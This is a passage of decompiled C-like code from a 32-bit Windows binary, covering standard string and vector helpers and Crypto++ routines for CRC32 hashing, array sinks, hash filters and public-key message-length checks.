  if ( (a2 | 0xF) == -1 )
  {
    v4 = a2;
  }
  else
  {
    v5 = (unsigned int)this[5];
    v6 = v5 >> 1;
    if ( v5 >> 1 > v4 / 3 )
    {
      if ( v5 > -2 - v6 )
        v4 = -2;
      else
        v4 = v6 + v5;
    }
  }
  v7 = sub_40B7DF(v4 + 1, 1u, 1);
  v10 = v7;
  if ( Size )
  {
    if ( (unsigned int)v3[5] < 0x10 )
      v8 = v3;
    else
      v8 = (const void **)*v3;
    memmove_0(v7, v8, Size);
  }
  sub_40BAFC(v3, 1, 0);
  if ( v3 )
    *v3 = v10;
  v3[5] = (const void *)v4;
  v9 = (unsigned int)v3[5] < 0x10;
  v3[4] = (const void *)Size;
  if ( !v9 )
    v3 = (const void **)*v3;
  *((_BYTE *)v3 + Size) = 0;
}
// 40B8FC: conditional instruction was optimized away because %Size.4!=0

//----- (0040B998) --------------------------------------------------------
bool __thiscall sub_40B998(const void **this, size_t Size, char a3)
{
  size_t v3; // eax
  bool v4; // zf

  if ( Size == -1 )
    sub_429710("string too long");
  if ( (unsigned int)this[5] < Size )
  {
    sub_40B856(this, Size, (size_t)this[4]);
LABEL_13:
    v4 = Size == 0;
    return !v4;
  }
  if ( a3 && Size < 0x10 )
  {
    v3 = (size_t)this[4];
    if ( Size < v3 )
      v3 = Size;
    sub_40BAFC(this, 1, v3);
    goto LABEL_13;
  }
  v4 = Size == 0;
  if ( !Size )
  {
    this[4] = 0;
    if ( (unsigned int)this[5] >= 0x10 )
      this = (const void **)*this;
    *(_BYTE *)this = 0;
    goto LABEL_13;
  }
  return !v4;
}

//----- (0040B9F6) --------------------------------------------------------
unsigned int __thiscall sub_40B9F6(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  unsigned int result; // eax

  v2 = (this[2] - *this) >> 2;
  result = 0;
  if ( 0x3FFFFFFF - (v2 >> 1) >= v2 )
    result = (v2 >> 1) + v2;
  if ( result < a2 )
    return a2;
  return result;
}

//----- (0040BA21) --------------------------------------------------------
bool __fastcall sub_40BA21(_DWORD *a1, int a2, unsigned int a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  bool result; // al

  result = 0;
  if ( a3 )
  {
    v3 = a1[5] < 0x10u ? a1 : (_DWORD *)*a1;
    if ( a3 >= (unsigned int)v3 )
    {
      v4 = a1[5] < 0x10u ? a1 : (_DWORD *)*a1;
      if ( (unsigned int)v4 + a1[4] > a3 )
        return 1;
    }
  }
  return result;
}

//----- (0040BA59) --------------------------------------------------------
_DWORD *__thiscall sub_40BA59(int this, unsigned int a2)
{
  _DWORD *v3; // edi
  int v4; // ebx
  _DWORD *result; // eax

  v3 = sub_40B7DF(a2, 4u, 1);
  sub_40AAC1(*(void **)this, *(_DWORD *)(this + 4), v3);
  v4 = (*(_DWORD *)(this + 4) - *(_DWORD *)this) >> 2;
  if ( *(_DWORD *)this )
    std::_Deallocate(*(void **)this, (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2, 4u);
  *(_DWORD *)(this + 8) = &v3[a2];
  result = &v3[v4];
  *(_DWORD *)(this + 4) = result;
  *(_DWORD *)this = v3;
  return result;
}

//----- (0040BAB4) --------------------------------------------------------
unsigned int __thiscall sub_40BAB4(_DWORD *this, unsigned int a2)
{
  int v3; // edx
  unsigned int result; // eax
  int v5; // edx
  unsigned int v6; // eax

  v3 = this[1];
  result = (this[2] - v3) >> 2;
  if ( result < a2 )
  {
    v5 = (v3 - *this) >> 2;
    if ( 0x3FFFFFFF - v5 < a2 )
      sub_429710("vector<T> too long");
    v6 = sub_40B9F6(this, v5 + a2);
    return (unsigned int)sub_40BA59((int)this, v6);
  }
  return result;
}

//----- (0040BAFC) --------------------------------------------------------
void __thiscall sub_40BAFC(_DWORD *this, char a2, size_t Size)
{
  _DWORD *v3; // esi
  void *v4; // ebx
  bool v5; // cf

  v3 = this;
  if ( a2 && this[5] >= 0x10u )
  {
    v4 = (void *)*this;
    if ( Size )
      memmove_0(this, v4, Size);
    std::_Deallocate(v4, v3[5] + 1, 1u);
  }
  v3[5] = 15;
  v5 = v3[5] < 0x10u;
  v3[4] = Size;
  if ( !v5 )
    v3 = (_DWORD *)*v3;
  *((_BYTE *)v3 + Size) = 0;
}

//----- (0040BB4F) --------------------------------------------------------
int __thiscall sub_40BB4F(int this)
{
  int result; // eax

  if ( *(_DWORD *)this )
  {
    std::_Deallocate(*(void **)this, (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2, 4u);
    result = 0;
    *(_DWORD *)this = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (0040BB78) --------------------------------------------------------
void **__thiscall sub_40BB78(void **this, void **a2, unsigned int a3, unsigned int a4)
{
  void **v4; // ebx
  size_t v6; // edi
  void *v7; // ecx
  bool v8; // cf
  void **v9; // eax

  v4 = a2;
  sub_40B83F(a2, a3);
  v6 = a4;
  if ( (char *)a4 > (char *)a2[4] - a3 )
    v6 = (size_t)a2[4] - a3;
  if ( this == a2 )
  {
    std::string::erase(v6 + a3);
    sub_404EE7(this, 0, a3);
  }
  else if ( sub_40B998((const void **)this, v6, 0) )
  {
    if ( (unsigned int)a2[5] >= 0x10 )
      v4 = (void **)*a2;
    if ( (unsigned int)this[5] < 0x10 )
      v7 = this;
    else
      v7 = *this;
    if ( v6 )
      memmove_0(v7, (char *)v4 + a3, v6);
    v8 = (unsigned int)this[5] < 0x10;
    this[4] = (void *)v6;
    if ( v8 )
      v9 = this;
    else
      v9 = (void **)*this;
    *((_BYTE *)v9 + v6) = 0;
  }
  return this;
}
// 4061F3: using guessed type _DWORD __stdcall std::string::erase(_DWORD);

//----- (0040BC05) --------------------------------------------------------
void **__fastcall sub_40BC05(void **a1, int a2, _BYTE *Src, size_t Size)
{
  _BYTE *v5; // eax
  void *v7; // eax
  bool v8; // cf
  _BYTE *v9; // eax

  if ( sub_40BA21(a1, a2, (unsigned int)Src) )
  {
    if ( (unsigned int)a1[5] < 0x10 )
      v5 = a1;
    else
      v5 = *a1;
    return sub_40BB78(a1, a1, Src - v5, Size);
  }
  else
  {
    if ( sub_40B998((const void **)a1, Size, 0) )
    {
      if ( (unsigned int)a1[5] < 0x10 )
        v7 = a1;
      else
        v7 = *a1;
      if ( Size )
        memmove_0(v7, Src, Size);
      v8 = (unsigned int)a1[5] < 0x10;
      a1[4] = (void *)Size;
      if ( v8 )
        v9 = a1;
      else
        v9 = *a1;
      v9[Size] = 0;
    }
    return a1;
  }
}

//----- (0040BC7D) --------------------------------------------------------
unsigned int __cdecl sub_40BC7D(const char *a1)
{
  if ( *a1 )
    return strlen(a1);
  else
    return 0;
}

//----- (0040BC96) --------------------------------------------------------
unsigned int __thiscall sub_40BC96(_DWORD *this, unsigned int *a2)
{
  unsigned int result; // eax
  int v4; // edi
  unsigned int *v5; // ecx

  result = this[1];
  if ( (unsigned int)a2 >= result || *this > (unsigned int)a2 )
  {
    if ( result == this[2] )
      result = sub_40BAB4(this, 1u);
    v5 = (unsigned int *)this[1];
    if ( v5 )
    {
      result = *a2;
      goto LABEL_11;
    }
  }
  else
  {
    v4 = ((int)a2 - *this) >> 2;
    if ( result == this[2] )
      result = sub_40BAB4(this, 1u);
    v5 = (unsigned int *)this[1];
    if ( v5 )
    {
      result = *(_DWORD *)(*this + 4 * v4);
LABEL_11:
      *v5 = result;
    }
  }
  this[1] += 4;
  return result;
}

//----- (0040BCE8) --------------------------------------------------------
void *__thiscall sub_40BCE8(int this, size_t Size)
{
  void *result; // eax

  result = sub_4099B2(this, *(void **)(this + 12), *(_DWORD *)(this + 8), Size, 1);
  *(_DWORD *)(this + 4) = -1;
  *(_DWORD *)(this + 8) = Size;
  *(_DWORD *)(this + 12) = result;
  return result;
}

//----- (0040BD11) --------------------------------------------------------
int __thiscall sub_40BD11(_DWORD *this, unsigned int a2)
{
  int result; // eax
  unsigned int v4; // edx

  result = this[1];
  v4 = (result - *this) >> 2;
  if ( v4 <= a2 )
  {
    if ( v4 < a2 )
    {
      sub_40BAB4(this, a2 - v4);
      memset((void *)this[1], 0, 4 * (a2 - ((this[1] - *this) >> 2)));
      result = (this[1] - *this) >> 2;
      this[1] += 4 * (a2 - result);
    }
  }
  else
  {
    result += 4 * (a2 - v4);
    this[1] = result;
  }
  return result;
}

//----- (0040BD6F) --------------------------------------------------------
_DWORD *__thiscall sub_40BD6F(_DWORD *this)
{
  _DWORD *result; // eax

  sub_40CAC3(this, 1);
  this[1] = -1;
  result = this;
  *this = &CryptoPP::CRC32::`vftable';
  return result;
}
// 46C0F4: using guessed type void *CryptoPP::CRC32::`vftable';

//----- (0040BD87) --------------------------------------------------------
void *__thiscall sub_40BD87(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040BDA1) --------------------------------------------------------
int __stdcall sub_40BDA1(int a1)
{
  sub_40AAE3(a1, "CRC32");
  return a1;
}

//----- (0040BDBF) --------------------------------------------------------
int __stdcall sub_40BDBF(_DWORD *a1)
{
  *a1 = 0;
  return 0;
}

//----- (0040BDCB) --------------------------------------------------------
char __cdecl sub_40BDCB(unsigned int a1, unsigned int a2)
{
  unsigned int v2; // esi
  bool v3; // al
  char v4; // cl
  unsigned int v5; // edx
  int v6; // edx

  v2 = a2;
  if ( a2 == 1 )
    return 1;
  v3 = sub_40A9A7(&a2);
  v4 = 0;
  if ( v3 )
  {
    v5 = v2 - 1;
    if ( v2 <= 1 )
      v5 = 0;
    v6 = a1 & v5;
  }
  else
  {
    v6 = a1 % v2;
  }
  if ( !v6 )
    return 1;
  return v4;
}

//----- (0040BE0E) --------------------------------------------------------
int __thiscall sub_40BE0E(void *this)
{
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD))(*(_DWORD *)this + 56))(this, 0, 0);
}

//----- (0040BE18) --------------------------------------------------------
char __thiscall sub_40BE18(int *this, int a2, unsigned int a3)
{
  char result; // al
  unsigned int i; // ecx

  result = sub_40DEDE(this, a3);
  this[1] = ~this[1];
  for ( i = 0; i < a3; ++i )
  {
    result = *((_BYTE *)this + i + 4);
    *(_BYTE *)(i + a2) = result;
  }
  this[1] = -1;
  return result;
}

//----- (0040BE49) --------------------------------------------------------
char __thiscall sub_40BE49(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned __int8 *v3; // edi
  unsigned int v5; // ebx
  int v6; // eax
  unsigned int v8; // ecx
  unsigned int v9; // ebx
  unsigned int v10; // ebx
  unsigned int v11; // ebx
  unsigned int v12; // ebx

  v3 = (unsigned __int8 *)a2;
  v5 = this[1];
  LOBYTE(v6) = sub_40BDCB(a2, 4u);
  while ( !(_BYTE)v6 && a3 )
  {
    v5 = dword_46B8F0[*v3++ ^ (unsigned __int8)v5] ^ (v5 >> 8);
    --a3;
    LOBYTE(v6) = sub_40BDCB((unsigned int)v3, 4u);
  }
  if ( a3 >= 4 )
  {
    v8 = a3 >> 2;
    do
    {
      v9 = *(_DWORD *)v3 ^ v5;
      a3 -= 4;
      v3 += 4;
      v10 = dword_46B8F0[(unsigned __int8)v9] ^ (v9 >> 8);
      v11 = dword_46B8F0[(unsigned __int8)v10] ^ (v10 >> 8);
      v12 = dword_46B8F0[(unsigned __int8)v11] ^ (v11 >> 8);
      LOBYTE(v6) = v12;
      v5 = dword_46B8F0[(unsigned __int8)v12] ^ (v12 >> 8);
      --v8;
    }
    while ( v8 );
  }
  for ( ; a3; --a3 )
  {
    v6 = *v3;
    v5 = dword_46B8F0[v6 ^ (unsigned __int8)v5] ^ (v5 >> 8);
    ++v3;
  }
  this[1] = v5;
  return v6;
}
// 46B8F0: using guessed type int dword_46B8F0[128];

//----- (0040BEFB) --------------------------------------------------------
int __cdecl sub_40BEFB(int a1, _BYTE **a2, char *Src)
{
  unsigned int v3; // eax
  int v4; // edx
  const void **v5; // eax

  v3 = sub_40BC7D(Src);
  v5 = sub_40C68E(a2, v4, Src, v3);
  std::string::string(v5);
  return a1;
}
// 40BF13: variable 'v4' is possibly undefined
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);

//----- (0040BF28) --------------------------------------------------------
_DWORD *__cdecl sub_40BF28(_DWORD *Src, char Val, _DWORD *a3)
{
  bool v3; // cf
  _BYTE *v4; // eax

  Src[5] = 15;
  v3 = Src[5] < 0x10u;
  Src[4] = 0;
  if ( v3 )
    v4 = Src;
  else
    v4 = (_BYTE *)*Src;
  *v4 = 0;
  sub_4093D7(Src, a3[4] + 1);
  sub_401F9A((void **)Src, 1u, Val);
  sub_40C5F5((const void **)Src, a3, 0, 0xFFFFFFFF);
  return Src;
}

//----- (0040BF8D) --------------------------------------------------------
_DWORD *__cdecl sub_40BF8D(_DWORD *a1, int a2, unsigned int a3)
{
  unsigned int v3; // eax
  unsigned int v4; // edi
  unsigned int v5; // edx
  char v6; // al
  _DWORD *v7; // eax
  _DWORD v9[6]; // [esp+14h] [ebp-40h] BYREF
  _DWORD Src[10]; // [esp+2Ch] [ebp-28h] BYREF
  int v11; // [esp+60h] [ebp+Ch]

  v3 = a2;
  v4 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    Src[5] = 15;
    Src[4] = 0;
    LOBYTE(Src[0]) = 0;
    Src[9] = 0;
    do
    {
      v5 = v3 % v4;
      v11 = v3 / v4;
      v6 = (~(a3 >> 26) & 0x20 | 0x41) - 10;
      if ( v5 < 0xA )
        v6 = 48;
      v7 = sub_40BF28(v9, v5 + v6, Src);
      unknown_libname_21(Src, v7);
      sub_40BAFC(v9, 1, 0);
      v3 = v11;
    }
    while ( v11 );
    a1[4] = 0;
    a1[5] = 15;
    *(_BYTE *)a1 = 0;
    sub_40C5A0(a1, Src);
    sub_40BAFC(Src, 1, 0);
  }
  else
  {
    sub_40AAE3((int)a1, "0");
  }
  return a1;
}
// 40BF8D: using guessed type _DWORD var_40[6];

//----- (0040C058) --------------------------------------------------------
int __cdecl sub_40C058(_DWORD *a1, _DWORD *a2)
{
  if ( (unsigned __int64)(unsigned int)*a1 <= *(_QWORD *)a2 )
    return 0;
  else
    return *a1 - *a2;
}

//----- (0040C08D) --------------------------------------------------------
_DWORD *__thiscall sub_40C08D(_DWORD *this, int a2, int a3)
{
  _DWORD *result; // eax

  sub_40CAC3(this, 0);
  this[6] = 0;
  this[7] = 0;
  this[3] = a2;
  this[4] = a3;
  result = this;
  *this = &CryptoPP::ArraySink::`vftable';
  this[1] = &CryptoPP::ArraySink::`vftable';
  return result;
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (0040C0C0) --------------------------------------------------------
void __thiscall sub_40C0C0(_DWORD *this)
{
  *this = &CryptoPP::ArraySink::`vftable';
  this[1] = &CryptoPP::ArraySink::`vftable';
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (0040C0DC) --------------------------------------------------------
int __thiscall sub_40C0DC(_DWORD *this)
{
  *this = &CryptoPP::HashFilter::`vftable';
  this[1] = &CryptoPP::HashFilter::`vftable';
  this[6] = &CryptoPP::HashFilter::`vftable';
  sub_40BAFC(this + 21, 1, 0);
  sub_40BAFC(this + 15, 1, 0);
  this[6] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  sub_4089EF(this + 7);
  return sub_405EEF(this + 3);
}
// 46C14C: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 46C154: using guessed type void *CryptoPP::HashFilter::`vftable';
// 46C214: using guessed type void *CryptoPP::HashFilter::`vftable';
// 46C224: using guessed type void *CryptoPP::HashFilter::`vftable';

//----- (0040C174) --------------------------------------------------------
char *__thiscall sub_40C174(char *this, char a2)
{
  char *v2; // ecx
  char *v3; // esi

  v2 = this - 4;
  v3 = v2;
  *(_DWORD *)v2 = &CryptoPP::ArraySink::`vftable';
  *((_DWORD *)v2 + 1) = &CryptoPP::ArraySink::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v3;
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';

//----- (0040C1B3) --------------------------------------------------------
_DWORD *__thiscall sub_40C1B3(_DWORD *Block, char a2)
{
  *Block = &CryptoPP::FilterPutSpaceHelper::`vftable';
  sub_4089EF(Block + 1);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46C14C: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (0040C1DB) --------------------------------------------------------
_DWORD *__thiscall sub_40C1DB(_DWORD *Block, char a2)
{
  sub_40C0DC(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040C1FA) --------------------------------------------------------
int __thiscall sub_40C1FA(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*this[11] + 8))(this[11], a2, 0);
  return a2;
}

//----- (0040C216) --------------------------------------------------------
int __thiscall sub_40C216(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[11] + 16))(this[11]);
}

//----- (0040C21E) --------------------------------------------------------
void __thiscall sub_40C21E(_DWORD *this, int a2, int a3, unsigned int a4, int a5, int a6)
{
  int v7; // eax
  _BYTE **v8; // eax
  _DWORD *v9; // eax
  int v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // esi
  _BYTE **v13; // eax
  char *v14; // eax
  _BYTE **v15; // eax
  char *v16; // eax
  _BYTE **v17; // eax
  _DWORD *v18; // eax
  unsigned int v19; // eax
  int v20; // eax
  int *v21; // esi
  int v22; // edi
  int *v23; // esi
  void *v24; // eax
  int v25; // edx
  int *v26; // esi
  unsigned int v27; // eax
  unsigned int v28; // [esp-14h] [ebp-78h]
  int v29; // [esp+10h] [ebp-54h] BYREF
  char v30[20]; // [esp+14h] [ebp-50h] BYREF
  char v31[4]; // [esp+28h] [ebp-3Ch] BYREF
  char v32[20]; // [esp+2Ch] [ebp-38h] BYREF
  int v33; // [esp+40h] [ebp-24h]
  int v34; // [esp+44h] [ebp-20h]
  unsigned int v35; // [esp+48h] [ebp-1Ch]
  int v36; // [esp+4Ch] [ebp-18h]
  _DWORD *v37; // [esp+50h] [ebp-14h]
  int v38; // [esp+54h] [ebp-10h]
  int v39; // [esp+60h] [ebp-4h]
  int v40[6]; // [esp+64h] [ebp+0h] BYREF
  char v41[24]; // [esp+7Ch] [ebp+18h] BYREF
  int v42[6]; // [esp+94h] [ebp+30h] BYREF
  char v43[24]; // [esp+ACh] [ebp+48h] BYREF
  char v44[24]; // [esp+C4h] [ebp+60h] BYREF
  int v45[10]; // [esp+DCh] [ebp+78h] BYREF
  _DWORD v46[6]; // [esp+104h] [ebp+A0h] BYREF
  int pExceptionObject[4]; // [esp+11Ch] [ebp+B8h] BYREF
  char v48[24]; // [esp+12Ch] [ebp+C8h] BYREF
  _DWORD v49[2]; // [esp+144h] [ebp+E0h] BYREF
  size_t v50[4]; // [esp+14Ch] [ebp+E8h] BYREF

  v37 = this;
  v38 = a2;
  v34 = a3;
  v33 = a5;
  v36 = a6;
  v7 = *this;
  v35 = a4;
  if ( a4 > (*(int (__thiscall **)(_DWORD *))(v7 + 20))(this) )
  {
    if ( !(*(int (__thiscall **)(_DWORD *))(*this + 20))(this) )
    {
      v8 = (_BYTE **)(*(int (__thiscall **)(_DWORD *, _DWORD *))(this[1] + 8))(this + 1, v49);
      v39 = 1;
      v9 = (_DWORD *)sub_40BEFB((int)v46, v8, ": this key is too short to encrypt any messages");
      sub_406307(pExceptionObject, 1, v9);
      pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v10 = (*(int (__thiscall **)(_DWORD *))(*this + 20))(this);
    v11 = sub_40BF8D(v46, v10, 0xAu);
    v39 = 3;
    v12 = sub_40BF8D(v49, a4, 0xAu);
    v13 = (_BYTE **)(*(int (__thiscall **)(_DWORD *, char *))(this[1] + 8))(this + 1, v44);
    v14 = (char *)sub_40BEFB((int)v43, v13, ": message length of ");
    v15 = (_BYTE **)sub_409630((int)v42, v14, v12);
    v16 = (char *)sub_40BEFB((int)v41, v15, " exceeds the maximum of ");
    v17 = (_BYTE **)sub_409630((int)v40, v16, v11);
    v18 = (_DWORD *)sub_40BEFB((int)v48, v17, " for this public key");
    LOBYTE(v39) = 9;
    sub_406307(v45, 1, v18);
    v45[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(v45, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v19 = sub_4091D2(this);
  sub_408A33(v50, (v19 + 7) >> 3);
  v20 = this[2];
  v39 = 10;
  v21 = (int *)(*(int (__thiscall **)(_DWORD *))(v20 + 12))(this + 2);
  v22 = *v21;
  sub_4091D2(v37);
  v28 = v38;
  (*(void (__thiscall **)(int *))(v22 + 12))(v21);
  v23 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 8))(this + 2);
  v24 = sub_40E8A1(&v29, (void *)v50[3], v50[2], 0, 1);
  v25 = *v23;
  LOBYTE(v39) = 11;
  v26 = (int *)(*(int (__thiscall **)(int *, char *, int, void *))(v25 + 20))(v23, v31, v38, v24);
  LOBYTE(v39) = 12;
  v27 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v37 + 16))(v37, 0);
  sub_411B5F(v26, v33, v27, v28);
  sub_40891D((int)v32);
  sub_40891D((int)v30);
  sub_4089EF(v50);
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 40C21E: using guessed type _DWORD var_1C[2];
// 40C21E: using guessed type _DWORD var_5C[6];
// 40C21E: using guessed type char var_9C[24];
// 40C21E: using guessed type char var_B4[24];
// 40C21E: using guessed type int var_CC[6];
// 40C21E: using guessed type char var_E4[24];
// 40C21E: using guessed type int var_FC[6];
// 40C21E: using guessed type char var_34[24];
// 40C21E: using guessed type char var_138[4];
// 40C21E: using guessed type char var_134[20];
// 40C21E: using guessed type char var_14C[20];

//----- (0040C483) --------------------------------------------------------
int __cdecl sub_40C483(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8, unsigned int a9)
{
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  _DWORD *v11; // ebx
  _DWORD *v12; // esi
  int v14[30]; // [esp+24h] [ebp-7Ch] BYREF
  int v15; // [esp+9Ch] [ebp-4h]

  v9 = operator new(0x20u);
  if ( !a8 )
  {
    v15 = 1;
    if ( v9 )
    {
      v10 = sub_40C08D(v9, a2, a3);
      goto LABEL_7;
    }
LABEL_6:
    v10 = 0;
    goto LABEL_7;
  }
  v10 = v9;
  v15 = 0;
  if ( !v9 )
    goto LABEL_6;
  sub_40C08D(v9, a2, a3);
  *v10 = &CryptoPP::ArrayXorSink::`vftable';
  v10[1] = &CryptoPP::ArrayXorSink::`vftable';
LABEL_7:
  v15 = -1;
  sub_41D4A7((int)v14, a1, (int)v10, 0, -1, dword_48C024, dword_48C024);
  v11 = v10 + 6;
  v15 = 2;
  v12 = v10 + 4;
  while ( sub_40C058(v12, v11) )
  {
    (*(void (__thiscall **)(int *, int, int, _DWORD, int))(v14[0] + 20))(v14, a4, a5, 0, 1);
    sub_40DA3B(v14, a9++, 1, 1);
    (*(void (__thiscall **)(int *, int, int, _DWORD, int))(v14[0] + 20))(v14, a6, a7, 0, 1);
    (*(void (__thiscall **)(int *, _DWORD, _DWORD, int, int))(v14[0] + 20))(v14, 0, 0, -1, 1);
  }
  return sub_40C0DC(v14);
}
// 46C2F0: using guessed type void *CryptoPP::ArrayXorSink::`vftable';
// 46C3A4: using guessed type void *CryptoPP::ArrayXorSink::`vftable';
// 48C024: using guessed type _DWORD dword_48C024[6];

//----- (0040C5A0) --------------------------------------------------------
int __thiscall sub_40C5A0(_DWORD *this, _DWORD *Src)
{
  _BYTE *v2; // esi
  int result; // eax

  v2 = Src;
  if ( Src[5] >= 0x10u )
  {
    if ( this )
      *this = *Src;
    *Src = 0;
  }
  else if ( Src[4] != -1 )
  {
    memmove(this, Src, Src[4] + 1);
  }
  this[4] = Src[4];
  result = Src[5];
  this[5] = result;
  Src[5] = 15;
  Src[4] = 0;
  if ( Src[5] >= 0x10u )
    v2 = (_BYTE *)*Src;
  *v2 = 0;
  return result;
}

//----- (0040C5F5) --------------------------------------------------------
const void **__thiscall sub_40C5F5(const void **this, _DWORD *a2, unsigned int a3, unsigned int a4)
{
  _DWORD *v4; // ebx
  size_t v6; // edi
  char *v7; // ecx
  char *v8; // ebp
  char *v9; // ecx
  bool v10; // cf
  char *v11; // eax

  v4 = a2;
  sub_40B83F(a2, a3);
  v6 = a4;
  v7 = (char *)this[4];
  if ( a4 > a2[4] - a3 )
    v6 = a2[4] - a3;
  if ( ~(unsigned int)v7 <= v6 )
    sub_429710("string too long");
  v8 = &v7[v6];
  if ( v6 && sub_40B998(this, (size_t)&v7[v6], 0) )
  {
    if ( a2[5] >= 0x10u )
      v4 = (_DWORD *)*a2;
    if ( (unsigned int)this[5] < 0x10 )
      v9 = (char *)this;
    else
      v9 = (char *)*this;
    memmove_0((char *)this[4] + (_DWORD)v9, (char *)v4 + a3, v6);
    v10 = (unsigned int)this[5] < 0x10;
    this[4] = v8;
    if ( v10 )
      v11 = (char *)this;
    else
      v11 = (char *)*this;
    v8[(_DWORD)v11] = 0;
  }
  return this;
}
// 40C64F: conditional instruction was optimized away because edi.4!=0

//----- (0040C68E) --------------------------------------------------------
const void **__fastcall sub_40C68E(_BYTE **a1, int a2, _BYTE *Src, size_t Size)
{
  _BYTE *v5; // eax
  unsigned int v7; // ecx
  size_t v8; // ebp
  char *v9; // ecx
  bool v10; // cf
  _BYTE *v11; // eax

  if ( sub_40BA21(a1, a2, (unsigned int)Src) )
  {
    if ( (unsigned int)a1[5] < 0x10 )
      v5 = a1;
    else
      v5 = *a1;
    return sub_40C5F5((const void **)a1, a1, Src - v5, Size);
  }
  else
  {
    v7 = (unsigned int)a1[4];
    if ( ~v7 <= Size )
      sub_429710("string too long");
    v8 = v7 + Size;
    if ( Size && sub_40B998((const void **)a1, v7 + Size, 0) )
    {
      if ( (unsigned int)a1[5] < 0x10 )
        v9 = (char *)a1;
      else
        v9 = *a1;
      memmove_0(&a1[4][(_DWORD)v9], Src, Size);
      v10 = (unsigned int)a1[5] < 0x10;
      a1[4] = (_BYTE *)v8;
      if ( v10 )
        v11 = a1;
      else
        v11 = *a1;
      v11[v8] = 0;
    }
    return (const void **)a1;
  }
}
// 40C6F1: conditional instruction was optimized away because %Size.4!=0

//----- (0040C72A) --------------------------------------------------------
const void **__thiscall sub_40C72A(
        const void **this,
        unsigned int a2,
        const void **a3,
        unsigned int a4,
        unsigned int a5)
{
  unsigned int v6; // ebp
  const void **v7; // ebx
  size_t v8; // edi
  unsigned int v9; // ecx
  const void **v10; // edx
  const void **v11; // ecx
  size_t v12; // eax
  const void **v13; // edx
  const void **v14; // ecx
  const void **v15; // ecx
  bool v16; // cf
  const void **v17; // eax
  char *v19; // [esp+1Ch] [ebp+Ch]

  sub_40B83F(this, a2);
  v6 = a4;
  v7 = a3;
  sub_40B83F(a3, a4);
  v8 = a5;
  v9 = (unsigned int)this[4];
  if ( (char *)a5 > (char *)a3[4] - a4 )
    v8 = (size_t)a3[4] - a4;
  if ( ~v9 <= v8 )
    sub_429710("string too long");
  v19 = (char *)(v9 + v8);
  if ( v8 && sub_40B998(this, v9 + v8, 0) )
  {
    if ( (unsigned int)this[5] < 0x10 )
      v10 = this;
    else
      v10 = (const void **)*this;
    if ( (unsigned int)this[5] < 0x10 )
      v11 = this;
    else
      v11 = (const void **)*this;
    v12 = (size_t)this[4] - a2;
    if ( v12 )
      memmove((char *)v11 + a2 + v8, (char *)v10 + a2, v12);
    if ( this == a3 )
    {
      if ( (unsigned int)this[5] < 0x10 )
        v13 = this;
      else
        v13 = (const void **)*this;
      if ( (unsigned int)this[5] < 0x10 )
        v14 = this;
      else
        v14 = (const void **)*this;
      if ( a2 < v6 )
        v6 += v8;
      memmove((char *)v14 + a2, (char *)v13 + v6, v8);
    }
    else
    {
      if ( (unsigned int)a3[5] >= 0x10 )
        v7 = (const void **)*a3;
      if ( (unsigned int)this[5] < 0x10 )
        v15 = this;
      else
        v15 = (const void **)*this;
      memmove_0((char *)v15 + a2, (char *)v7 + v6, v8);
    }
    v16 = (unsigned int)this[5] < 0x10;
    this[4] = v19;
    if ( v16 )
      v17 = this;
    else
      v17 = (const void **)*this;
    v19[(_DWORD)v17] = 0;
  }
  return this;
}
// 40C7DF: conditional instruction was optimized away because edi.4!=0
// 40C812: conditional instruction was optimized away because edi.4!=0

//----- (0040C853) --------------------------------------------------------
_DWORD *__cdecl sub_40C853(_DWORD *a1, _DWORD *a2, char *Src)
{
  bool v3; // cf
  _BYTE *v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // eax
  int v7; // edx

  a1[5] = 15;
  v3 = a1[5] < 0x10u;
  a1[4] = 0;
  if ( v3 )
    v4 = a1;
  else
    v4 = (_BYTE *)*a1;
  *v4 = 0;
  v5 = sub_40BC7D(Src);
  sub_4093D7(a1, a2[4] + v5);
  sub_40C5F5((const void **)a1, a2, 0, 0xFFFFFFFF);
  v6 = sub_40BC7D(Src);
  sub_40C68E((_BYTE **)a1, v7, Src, v6);
  return a1;
}
// 40C8BA: variable 'v7' is possibly undefined

//----- (0040C8C7) --------------------------------------------------------
int __cdecl sub_40C8C7(int a1, char *Src, _BYTE **a3)
{
  unsigned int v3; // eax
  int v4; // edx
  const void **v5; // eax

